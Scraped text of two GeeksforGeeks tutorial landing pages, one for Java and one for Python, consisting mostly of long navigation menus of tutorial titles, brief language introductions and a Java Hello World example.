Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2Difference between List VS Set VS Tuple in Python Most Visited Articles Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try OnceCheck whether count of odd and even factors of a number are equalFibonacci Series Program in JavaScriptHow to send an email from JavaScript ? room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Java Programming Language - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Basicsexpand_moreJava Programming LanguageIntroduction to JavaSetting up the environment in JavaJava Basic SyntaxBeginning Java programming with Hello World ExampleCommand Line arguments in JavaHow JVM Works – JVM Architecture?Differences between JDK, JRE and JVMJava IdentifiersData types in JavaVariables in JavaComments in JavaOperators in JavaWays to read input from console in JavaFlow Controlexpand_moreDecision Making in Java (if, if-else, switch, break, continue, jump)Loops in JavaJava For loop with ExamplesFor-each loop in JavaJava while loop with ExamplesSwitch Statement in JavaContinue Statement in JavaBreak statement in JavaStringsexpand_moreStrings in JavaString class in Java | Set 1StringBuffer class in JavaStringBuilder Class in Java with ExamplesArraysexpand_moreArrays in JavaMultidimensional Arrays in JavaJagged Array in JavaArray Copy in JavaHow to convert an Array to String in Java?How to compare two arrays in Java?Methodsexpand_moreMethods in JavaParameter Passing Techniques in Java with ExamplesReturning Multiple values in JavaDifferent ways of Method Overloading in JavaScope of Variables In JavaConstructorsexpand_moreConstructors in JavaCopy Constructor in JavaConstructor Overloading in JavaConstructor Chaining In Java with ExamplesPrivate Constructors and Singleton Classes in JavaOOP Conceptsexpand_moreClasses and Objects in JavaInheritance in JavaEncapsulation in JavaPolymorphism in JavaAbstraction in JavaOverriding in JavaOverloading in JavaException Handlingexpand_moreExceptions in JavaTypes of Exception in Java with ExamplesChecked vs Unchecked Exceptions in Javathrow and throws in JavaUser-defined Custom Exception in JavaInterfaces & Abstract Classesexpand_moreInterfaces in JavaNested Interface in JavaMarker interface in JavaAbstract Classes in JavaDifference between Abstract Class and Interface in JavaFunctional Interfaces In JavaComparator Interface in Java with ExamplesCollectionsexpand_moreCollections in JavaCollections Class in JavaCollection vs Collections in Java with ExampleJava | Implementing Iterator and Iterable InterfaceList Interface in Java with ExamplesArrayList in JavaVector Class in JavaStack Class in JavaLinkedList in JavaQueue Interface In JavaPriorityQueue in JavaDeque interface in Java with ExampleArrayDeque in JavaSet in JavaHashSet in JavaLinkedHashSet in Java with ExamplesSortedSet Interface in Java with ExamplesNavigableSet in Java with ExamplesTreeSet in JavaMap Interface in JavaHashMap in Java with ExamplesHashtable in JavaLinkedHashMap in JavaSortedMap Interface in Java with ExamplesTreeMap in JavaMultithreadingexpand_moreMultithreading in JavaLifecycle and States of a Thread in JavaMain thread in JavaJava Thread Priority in MultithreadingSynchronized in JavaFile Handlingexpand_moreFile Handling in Java with CRUD operationsJava.io.InputStream Class in JavaJava.io.OutputStream class in JavaJava.io.File Class in JavaFile Permissions in JavaCopying file using FileStreams in JavaDelete a file using Java Java Programming Language Java is one of the most popular and widely used programming language. Java has been one of the most popular programming language for many years. Java is Object Oriented. However it is not considered as pure object oriented as it provides support for primitive data types (like int, char, etc) The Java codes are first compiled into byte code (machine independent code). Then the byte code is run on Java Virtual Machine (JVM) regardless of the underlying architecture. Java syntax is similar to C/C++. But Java does not provide low level programming functionalities like pointers. Also, Java codes are always written in the form of classes and objects. Java is used in all kind of applications like Mobile Applications (Android is Java based), desktop applications, web applications, client server applications, enterprise applications and many more. When compared with C++, Java codes are generally more maintainable because Java does not allow many things which may lead bad/inefficient programming if used incorrectly. For example, non-primitives are always references in Java. So we cannot pass large objects (like we can do in C++) to functions, we always pass references in Java. One more example, since there are no pointers, bad memory access is also not possible. When compared with Python, Java kind of fits between C++ and Python. The programs written in Java typically run faster than corresponding Python programs and slower than C++. Like C++, Java does static type checking, but Python does not. Simple Hello World Program : // A Java program to print "Hello World" public class GFG { public static void main(String args[]) { System.out.println("Hello World"); } } Output : Hello World Overview, Basics, OOP concepts, Inheritance Operators, Strings, Input and Output, Arrays , Arrays Class, Important Keywords in Java ,Java vs C++, Methods in Java, Constructors, Exception Handling, Interfaces and Abstract Classes, Java Packages, Multithreading, Garbage Collection, Wrapper Classes, Reflection in Java, File Handling, Collection in Java, Collection Interview FAQ’s ,Collections Class (Contains utility functions on Collections), Useful and/or Advanced Features, Image Processing, Networking in Java, Interview Questions, Misc, Multiple Choice Questions, Java 8 Stream Methods Overview How to start learning Java Setting up the environment The Hello World Example(Practice) Java Naming Conventions JVM JVM Stack Area JVM Shutdown Hook Java Class File Differences between JDK, JRE and JVM Does JVM create object of Main class? How is Java platform independent? JDBC Drivers Is main method compulsory in Java? File names and class names How to run java class file which is in different directory? Microservices Introduction Using predefined class name as Class or Variable name in Java How do I become a good Java programmer? Basics Java Identifiers Data types How to define our own data type in java(enum) Enum with Customized Value StringBuffer appendCodePoint() Method Variables Scope of Variables Final variables Bounded Type Parameters Loops in Java(Practice) For-each loop in Java For Loop in Java | Important points Decision Making(if, if-else, switch, break, continue, jump)(Practice) Switch Statement in Java(Practice) String in Switch Case in Java Forward declarations Widening Primitive Conversion Type conversion in Java Comments in Java Does Java support goto? Interesting facts about null in Java Using _ (underscore) as variable name Currying Functions in Java with Examples Using underscore in Numeric Literals Binary search in Java Sorting in Java OOP concepts Classes and Objects Java object storage Different ways to create objects in Java How to swap or exchange objects Inheritance in Java Encapsulation in Java Abstraction in Java Run-time Polymorphism in Java Association,Composition and Aggregation Access and Non Access Modifiers in Java Access Modifiers this reference Method Overloading Output of Java program | Set 22 (Overloading) Method Overriding Output of Java program | Set 18 (Overriding) Understanding “static” in “public static void main” in Java Overloading or Overriding static methods Shadowing of static methods(Also called Method Hiding) Static methods vs Instance methods in Java Assigning values to static final variables in Java Covariant return types Object class Static class in Java Flexible nature of java.lang.Object Overriding equals method of Object class Overriding toString() method of Object class Instance Variable Hiding Static blocks in Java initializer block in java instance initializer block in java(non-static block) Static vs Dynamic Binding Why Java is not a purely Object-Oriented Language? Understanding Classes and Objects in Java Inheritance Inheritance in Java Multiple Inheritance Why Java does’nt support Multiple Inheritance – The Diamond Problem Java Object Creation of Inherited Class Inheritance and constructors Interfaces and Inheritance Using final with Inheritance Accessing Grandparent’s member Override private methods More restrictive access to a derived class method in Java Parent and Child classes having same data member Object Serialization with Inheritance Referencing Subclass objects with Subclass vs Superclass reference Does overloading work with inheritance Output of Java Program | Set 20 (Inheritance) Operators All Operators Bitwise operators in Java new operator Bitwise right shift operators Java instanceof operator and its applications Autoboxed Integer objects Addition and Concatenation Numeric Promotion in Conditional Expression Input and Output Character Stream Vs Byte Stream DoubleStream mapToObj() in Java Command Line arguments Scanner Class Scanner and nextChar() Scanner vs BufferReader Class Formatted output Fast I/O for Competitive Programming Reading input from console Strings in Java String Class(Practice) StringBuffer Class StringBuilder Class StringTokenizer class – Set 1, Set 2 StringJoiner in Java8 Implementations: Initialize and Compare Strings String vs StringBuilder vs StringBuffer When to use StringJoiner over StringBuilder? Integer to String Conversions String to Integer– parseInt() Swap two Strings without using third variable Searching characters and substring in a String Compare two Strings in Java Reverse a string in Java (5 Different Ways) Remove Leading Zeros From String in Java Trim (Remove leading and trailing spaces) a string Counting number of lines, words, characters and paragraphs in a text file using Java Check if a string contains only alphabets in Java using Lambda expression Remove elements from a List that satisfy given predicate in Java Check if a string contains only alphabets in Java using ASCII values Check if a string contains only alphabets in Java using Regex More >> Arrays in Java Arrays in Java(Practice) Default Array values Util Arrays Class (Contains utility functions for Arrays) Reflect Array class in Java util.Arrays vs reflect.Array in Java Final arrays Interesting facts about Array assignment in Java Jagged Array Array IndexOutofbounds Exception Array vs ArrayList in Java Implementations: Compare two arrays ArrayList to Array Conversion Merge arrays into a new object array in Java More >> Stream in Java Java Stream Java Stream.Builder Java IntStream Java IntStream.Builder Java LongStream Java LongStream.Builder Java DoubleStream Java DoubleStream.Builder Java Stream Collectors Implementations: 10 Ways to Create a Stream in Java How to print elements of a Stream in Java 8 Program to Iterate over a Stream with Indices in Java 8 How to get ArrayList from Stream in Java 8 More >> Important Keywords List of all Java Keywords Important Keywords in Java this keyword super Keyword static keyword final keyword final, finally and finalize in Java abstract Keyword transient keyword in Java volatile keyword in Java strictfp keyword C++ vs Java C++ vs Java Static keyword in C++ vs Java Exception Handling in C++ vs Java Inheritance in C++ vs Java Virtual behavior differ in C++ vs Java Foreach in C++ and Java C/C++ Pointers vs Java References Comparison of boolean data type in C++ and Java Floating Point Operations & Associativity in C, C++ and Java Methods in Java Methods Parameters passing Returning Multiple values Throwable fillInStackTrace() method in Java Valid variants of main() Variable Arguments (Varargs) method Method Overloading Different ways of Method Overloading in Java Method overloading and null error Method Overloading with Autoboxing and Widening Method Overloading and Ambiguity in Varargs Overloading main() Overriding equals method Overriding toString() method Private and final methods Java is Strictly Pass by Value Clone() method Remote Method Invocation Default Methods Passing and Returning Objects in Java Date after() method in Java System.exit() method Constructors Constructors in Java Default constructor Assigning values to static final variables Copy Constructor Constructor Chaining Private Constructors and Singleton Classes Java Interview Questions on Constructors Singleton Class Constructor Overloading Output of Java Programs | Set 14 (Constructors) Exception Handling Exceptions OutOfMemoryError Exception 3 Different ways to print Exception messages in Java flow control in try-catch-finally Types of Exceptions Catching base and derived classes as exceptions Checked vs Unchecked Exceptions Throw and Throws User-defined Custom Exception Infinity or Exception? Multicatch Chained Exceptions Null Pointer Exception Output of Java program | Set 12(Exception Handling) Interfaces and Abstract Classes Interfaces Access specifier for methods in interfaces Access specifiers for classes or interfaces Abstract Classes Difference between Abstract Class and Interface in Java Comparator Interface Java Interface methods Nested Interface Nested Classes in Java Inner class in java Local Inner Class in Java Anonymous Inner Class in Java Functional Interfaces What is a Marker interface Questions on Abstract Classes and Interfaces Output of Java program | Set 15 (Inner Classes) Static method in Interface in Java Function Interface in Java with Examples Apache in Java Apache POI | Introduction Apache POI | Getting Started Reading and Writing data to excel file using Apache POI Creating Sheets in Excel File in Java using Apache POI Creating a Cell at specific position in Excel file using Java Opening Existing Excel sheet in Java using Apache POI Java Packages Packages Introduction java.io package java.lang package java.util package Collection in Java Collection: AbstractCollection Collections Class in Java Enumeration, Iterators and ListIterators Convert an Iterable to Collection in Java Using Iterators Iterator vs Foreach Types of iterator Creating Sequential Stream from an Iterator in Java Implementations: Output of Java Program | Set 13(Collections) Double Brace Initialization List: AbstractList AbstractSequentialList ArrayList (Practice) LinkedList Immutable List in Java (Guava) java.util.Concurrent: CopyOnWriteArrayList Implementations: Custom ArrayList in Java Java Collection| Difference between Synchronized ArrayList and CopyOnWriteArrayList More >> Queue: AbstractQueue java.util.Concurrent: ArrayBlockingQueue ConcurrentLinkedQueue LinkedBlockingQueue LinkedTransferQueue PriorityBlockingQueue Deque: ArrayDeque java.util.Concurrent: ConcurrentLinkedDeque LinkedBlockingDeque Set: AbstractSet EnumSet HashSet TreeSet java.util.Concurrent: ConcurrentSkipListSet CopyOnWriteArraySet LinkedHashSet Implementations: Internal working of Set/HashSet Merge two sets in Java Disjoint Set Data Structures (Java Implementation) More >> Map: EnumMap HashMap SortedMap WeakHashMap ImmutableMap (Guava) LinkedHashMap IdentityHashMap Dictionary java.util.Concurrent: ConcurrentHashMap Implementations: Working of HashMap Traverse through a HashMap in Java Program to Convert HashMap to TreeMap in Java More >> HashTable Stack Vector Collection Interview FAQ’s Vector vs ArrayList ArrayList vs LinkedList Comparable vs Comparator Differences between TreeMap, HashMap and LinkedHashMap HashMap vs HashTable Hashmap vs WeakHashMap in Java How to Synchronize ArrayList in Java ArrayList and LinkedList remove() methods How to Remove an element from ArrayList Java.nio IntBuffer methods in Java FloatBuffer methods in Java DoubleBuffer methods in Java ShortBuffer methods in Java ByteBuffer methods in Java CharBuffer methods in Java Java.Security Signature methods in Java SecureRandom methods in Java KeyPairGenerator methods in Java KeyFactory methods in Java AlgorithmParameterGenerator methods in Java Provider methods in Java Multithreading Multithreading Lifecycle and states of a thread Main thread Methods to prevent thread execution inter thread communication Java.lang.Thread class Start() function in multithreading Java Thread Priority Joining Threads in Java Naming a thread and fetching name of current thread in Java Synchronization Method and Block Synchronization Producer-Consumer solution Thread Pools in Java Semaphore in Java Java.util.concurrent.Semaphore class in Java CountDownLatch Deadlock in java Daemon thread Reentrant Lock Cyclic Barrier in Java Callable and Future in Java Runtime Class Output of Java program | Set 16 (Threads) Garbage Collection Garbage Collection How to make object eligible for garbage collection in Java? Mark-and-Sweep Island of Isolation Automatic Resource Management Output of Java programs | Set 10 (Garbage Collection) Iterator vs Collection in Java Wrapper Classes Wrapper Classes in Java Primitive Wrapper Classes are Immutable in Java Number Class Integer class Byte class Short class Long class Float class Double class Boolean Class Character Class Autoboxing and Unboxing in Java Reflection in Java Reflection in Java Method Class in Java Reflect Array class in Java util.Arrays vs reflect.Array in Java new operator vs newInstance() instanceof operator vs isInstance() File Handling File class Ways of Reading a text file in Java file permissions in java Moving a file from one directory to another using Java Copying file using FileStreams Delete a file using Java Java program to delete duplicate lines in text file Java program to merge two files alternatively into third file Java program to List all files in a directory and nested sub-directories | Recursive approach Java program to delete certain text from a file Check if a File is hidden in Java Redirecting System.out.println() output to a file Java Tuple Introduction Unit Class in JavaTuples Pair Class in JavaTuples Triplet Class in JavaTuples Quartet Class in JavaTuples Quintet Class in JavaTuples Sextet Class in JavaTuples Septet Class in JavaTuples Octet Class in JavaTuples Ennead Class in JavaTuples Decade Class in JavaTuples LabelValue Class in JavaTuples KeyValue Class in JavaTuples Implement Pair Class with Unit Class in Java using JavaTuples Implement Quartet Class with Triplet Class in Java using JavaTuples Implement Triplet Class with Pair Class in Java using JavaTuples Implement Decade Class from Ennead Class in Java using JavaTuples Implement Ennead Class from Octet Class in Java using JavaTuples Implement Septet Class from Sextet Class in Java using JavaTuples Implement Octet Class from Septet Class in Java using JavaTuples Implement Sextet Class from Quintet Class in Java using JavaTuples Implement Quintet Class with Quartet Class in Java using JavaTuples Useful and/or Advanced Features Generics Wildcards in Java Assertions Annotations Serialization and Deserialization Lambda Expressions – Java 8 Stream BigInteger Class Image Processing Set 1 (Read and Write) Set 2 (Get and Set Pixels) Set 3 (Colored image to greyscale image conversion) Set 4 (Colored image to Negative image conversion) Set 5 (Colored to Red Green Blue Image Conversion) Set 6 (Colored image to Sepia image conversion) Set 7 (Creating a random pixel image) Image Processing in Java | Set 8 (Creating mirror image) Set 9 ( Face Detection ) Set 10 ( Watermarking an image ) Set 11 (Changing orientation of image) Set 12 ( Contrast Enhancement ) Set 13 (Brightness Enhancement) Set 14 ( Sharpness Enhancement ) Set 14 ( Comparison of two images ) Compressing and Decompressing files in Java Networking in Java Socket Programming Introducing Threads in Socket Programming in Java URL class in Java HttpURLConnection Class Reading from a URL using URLConnection Class Inet Address Class MD2 Hash In Java SHA-1 Hash In Java SHA-224 Hash In Java SHA-256 Hash in Java SHA-384 Hash In Java SHA-512 Hash In Java Java.Time Package Clock Class in Java Duration Class in Java Instant Class in Java LocalDate Class in Java LocalDateTime Class in Java LocalTime Class in Java MonthDay Class in Java Period Class in Java Year Class in Java YearMonth Class in Java ZonedDateTime Class in Java Java.Lang Package Boolean Class in Java Byte Class in Java Character Class in Java Character.Subset Class in Java Character.UnicodeBlock Class in Java Class Class in Java Set 1, Set 2 Compiler Class in Java Double Class in Java Enum Class in Java Float Class in Java InheritableThreadLocal Class in Java Integer Class in Java Long Class in Java Math Class in Java Set 1, Set 2 Number Class in Java Object Class in Java Package Class in Java Process Class in Java ProcessBuilder Class in Java Runtime Class in Java Short Class in Java StackTraceElement Class in Java StrictMath Class in Java Set 1, Set 2 String Class in Java Set 1, Set 2 StringBuffer Class in Java StringBuilder Class in Java System Class in Java Thread Class in Java ThreadGroup Class in Java ThreadLocal Class in Java Throwable Class in Java Void Class in Java Java.Math Package BigDecimal Class in Java BigInteger Class in Java Java Recent Articles! Java Output & Multiple Choice Questions My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseTypes of Environments in AITop 40 Python Interview Questions & AnswersProof that Clique Decision problem is NP-Complete | Set 2 Most Visited Articles Difference between List VS Set VS Tuple in PythonMajor Kernel Functions in Support Vector Machine (SVM)Ways to import CSV files in Google ColabTop 5 IDEs for C++ That You Should Try OnceFibonacci Series Program in JavaScript room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Python Programming Language - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Introductionexpand_morePython Programming LanguagePython Language IntroductionPython Language advantages and applicationsDownload and Install Python 3 Latest VersionPython 3 basicsKeywords in Python – Set 1Namespaces and Scope in PythonStatement, Indentation and Comment in PythonHow to assign values to variables in Python and other languagesInput/Outputexpand_moreTaking input in PythonTaking input from console in PythonTaking multiple inputs from user in PythonPython | Output using print() functionHow to print without newline in Python?Python end parameter in print()Python | sep parameter in print()Python | Output FormattingOperatorsexpand_morePython OperatorsTernary Operator in PythonDivision Operators in PythonOperator Overloading in PythonAny All in PythonOperator Functions in Python | Set 1Operator Functions in Python | Set 2Difference between == and is operator in PythonPython Membership and Identity OperatorsData Typesexpand_morePython | Set 3 (Strings, Lists, Tuples, Iterations)Python StringPython ListsPython TuplesPython SetsPython DictionaryPython ArraysControl Flowexpand_morePython if elseChaining comparison operators in PythonPython For LoopsPython While LoopsPython break statementPython Continue StatementPython pass StatementLooping Techniques in PythonFunctionsexpand_moreFunctions in Python*args and **kwargs in PythonWhen to use yield instead of return in Python?Generators in PythonPython lambdaGlobal and Local Variables in PythonGlobal keyword in PythonFirst Class functions in PythonPython ClosuresDecorators in PythonDecorators with parameters in PythonMemoization using decorators in PythonPython OOPexpand_morePython Classes and ObjectsConstructors in PythonDestructors in PythonInheritance in PythonTypes of inheritance PythonEncapsulation in PythonPolymorphism in PythonClass or Static Variables in Pythonclass method vs static method in PythonMetaprogramming with Metaclasses in PythonException Handlingexpand_morePython Exception HandlingPython Try ExceptErrors and Exceptions in PythonBuilt-in Exceptions in PythonUser-defined Exceptions in Python with ExamplesNZEC error in PythonFile handlingexpand_moreFile Handling in PythonOpen a File in PythonHow to read from a file in PythonWriting to file in PythonPython Regexexpand_moreRegular Expression in Python with Examples | Set 1Regular Expressions in Python – Set 2 (Search, Match and Find All)Python Regex: re.search() VS re.findall()Verbose in Python RegexPassword validation in PythonPython Collectionsexpand_moreCounters in Python | Set 1 (Initialization and Updation)OrderedDict in PythonDefaultdict in PythonChainMap in PythonNamedtuple in PythonDeque in PythonHeap queue (or heapq) in PythonCollections.UserDict in PythonCollections.UserList in PythonCollections.UserString in PythonPython NumPyexpand_morePython NumpyNumpy | ndarrayNumpy | Array CreationNumpy | IndexingBasic Slicing and Advanced Indexing in NumPy PythonNumpy | Data Type ObjectsNumpy | Iterating Over ArrayNumpy | Binary OperationsNumpy | Mathematical FunctionNumpy | String OperationsNumpy | Linear AlgebraNumpy | Sorting, Searching and CountingRandom sampling in numpy | randint() functionRandom sampling in numpy | random_sample() functionRandom sampling in numpy | ranf() functionRandom sampling in numpy | random_integers() functionNumpy ufunc | Universal functionsPython Pandasexpand_moreIntroduction to Pandas in PythonHow to Install Python Pandas on Windows and Linux?Python | Pandas DataFrameCreating a Pandas DataFramePython | Pandas SeriesCreating a Pandas SeriesPython | Pandas Dataframe/Series.head() methodPython | Pandas Dataframe.describe() methodDealing with Rows and Columns in Pandas DataFramePython | Pandas Extracting rows using .loc[]Python | Extracting rows using Pandas .iloc[]Indexing and Selecting Data with PandasBoolean Indexing in PandasPandas GroupByPython | Pandas Merging, Joining, and ConcatenatingPython | Working with date and time using PandasPython | Pandas Working With Text DataPython | Read csv using pandas.read_csv()Python | Working with Pandas and XlsxWriter | Set – 1Python Djangoexpand_moreDjango BasicsDjango Introduction and InstallationDjango Project MVT StructureHow to Create a Basic Project using MVT in Django ?How to Create an App in Django ?Django FormsRender HTML Forms (GET & POST) in DjangoDjango form field custom widgetsDjango ModelForm – Create form from ModelsDjango FormsetsDjango ModelFormSetsDjango TemplatesViews In Django | PythonDjango CRUD (Create, Retrieve, Update, Delete) Function Based ViewsClass Based Generic Views Django (Create, Retrieve, Update, Delete)Django ModelsDjango ORM – Inserting, Updating & Deleting DataDjango Basic App Model – Makemigrations and MigratePython JSONexpand_moreWorking With JSON Data in PythonRead, Write and Parse JSON using PythonAppend to JSON file using PythonPython CSVexpand_moreWorking with csv files in PythonReading CSV files in PythonWriting CSV files in PythonPython MySQLexpand_moreConnect MySQL database using MySQL-Connector PythonPython MySQL – Create DatabasePython: MySQL Create TablePython MySQL – Insert into TablePython MySQL – Select QueryPython MySQL – Where ClausePython MySQL – Order By ClausePython MySQL – Delete QueryPython MySQL – Drop TablePython MySQL – Update QueryPython MySQL – Limit ClausePython MySQL – JoinPython MongoDBexpand_moreInstalling MongoDB on Windows with PythonMongoDB and PythonCreate a database in MongoDB using PythonPython MongoDB – insert_one QueryPython MongoDB – insert_many QueryPython MongoDB – FindPython MongoDB – QueryPython MongoDB – SortMongoDB python | Delete Data and Drop CollectionPython Mongodb – Delete_one()Python Mongodb – Delete_many()Python MongoDB – Update_one()Python MongoDB – Update_many QueryPython MongoDB – Limit QueryPython MongoDB – create_index QueryPython MongoDB – drop_index QueryPython OpenCVexpand_moreIntroduction to OpenCVHow to install OpenCV for Python in Windows?Reading an image in OpenCV using PythonOpenCV | Saving an ImageArithmetic Operations on Images using OpenCV | Set-1 (Addition and Subtraction)Arithmetic Operations on Images using OpenCV | Set-2 (Bitwise Operations on Binary Images)Image Resizing using OpenCV | PythonImage Processing in Python (Scaling, Rotating, Shifting and Edge Detection)Python | Image blurring using OpenCVErosion and Dilation of images using OpenCV in pythonPython | Thresholding techniques using OpenCV | Set-1 (Simple Thresholding)Python | Thresholding techniques using OpenCV | Set-2 (Adaptive Thresholding)Python | Thresholding techniques using OpenCV | Set-3 (Otsu Thresholding)Filter Color with OpenCVPython | Bilateral FilteringPython | Background subtraction using OpenCVPython | Play a video using OpenCVExtract images from video in PythonFace Detection using Python and OpenCV with webcamPython Seleniumexpand_moreSelenium Basics – Components, Features, Uses and LimitationsComponents of SeleniumSelenium Python Introduction and InstallationNavigating links using get method – Selenium PythonInteracting with Webpage – Selenium PythonLocating single elements in Selenium PythonLocating multiple elements in Selenium PythonLocator Strategies – Selenium PythonAction Chains in Selenium PythonExceptions – Selenium PythonPython Tkinterexpand_moreIntroduction to TkinterWhat are Widgets in Tkinter?Python | Creating a button in tkinterPython Tkinter – LabelRadioButton in Tkinter | PythonPython Tkinter – Checkbutton WidgetPython Tkinter – Canvas WidgetCombobox Widget in tkinter | PythonPython Tkinter – Entry WidgetPython Tkinter – Text WidgetPython Tkinter – MessagePython | Menu widget in TkinterPython Tkinter – SpinBoxProgressbar widget in Tkinter | PythonPython-Tkinter ScrollbarPython Tkinter – ScrolledText WidgetPython Tkinter – ListBox WidgetPython Tkinter – Frame WidgetPython Tkinter – Scale WidgetHierarchical treeview in Python GUI applicationPython-Tkinter Treeview scrollbarPython Tkinter – Toplevel WidgetPython | askopenfile() function in TkinterPython | asksaveasfile() function in TkinterPython – Tkinter askquestion DialogPython Tkinter – MessageBox WidgetPython | place() method in TkinterPython | grid() method in TkinterPython | pack() method in TkinterPython | PanedWindow Widget in TkinterPython | Binding function in TkinterPython Tkinter – Validating Entry WidgetPython Kivyexpand_moreIntroduction to Kivy ; A Cross-platform Python FrameworkPython | Add Label to a kivy windowPython | Textinput widget in kivyPython | Canvas in kivyPython | Checkbox widget in KivyPython | Dropdown list in kivyPython | Carousel Widget In KivyPython | BoxLayout widget in KivyPython | Slider widget in KivyPython | Popup widget in KivyPython | Switch widget in KivyPython | Spinner widget in kivyPython | Progress Bar widget in kivyPython | Working with buttons in KivyPython | Float Layout in KivyGridLayouts in Kivy | PythonPython | StackLayout in KivyPython| AnchorLayout in KivyPython | Relative Layout in KivyPython | PageLayout in KivyPython Examples and Quizexpand_morePython Programming ExamplesPython Multiple Choice Questions Python Programming Language Python is a high-level, general-purpose and a very popular programming language. Python programming language (latest Python 3) is being used in web development, Machine Learning applications, along with all cutting edge technology in Software Industry. Python Programming Language is very well suited for Beginners, also for experienced programmers with other programming languages like C++ and Java. This specially designed Python tutorial will help you learn Python Programming Language in most efficient way, with the topics from basics to advanced (like Web-scraping, Django, Deep-Learning, etc.) with examples. Below are some facts about Python Programming Language: Python is currently the most widely used multi-purpose, high-level programming language. Python allows programming in Object-Oriented and Procedural paradigms. Python programs generally are smaller than other programming languages like Java. Programmers have to type relatively less and indentation requirement of the language, makes them readable all the time. Python language is being used by almost all tech-giant companies like – Google, Amazon, Facebook, Instagram, Dropbox, Uber… etc. The biggest strength of Python is huge collection of standard library which can be used for the following: Machine Learning GUI Applications (like Kivy, Tkinter, PyQt etc. ) Web frameworks like Django (used by YouTube, Instagram, Dropbox) Image processing (like OpenCV, Pillow) Web scraping (like Scrapy, BeautifulSoup, Selenium) Test frameworks Multimedia Scientific computing Text processing and many more.. Recent Articles on Python ! Python Programming Examples Python Output & Multiple Choice Questions 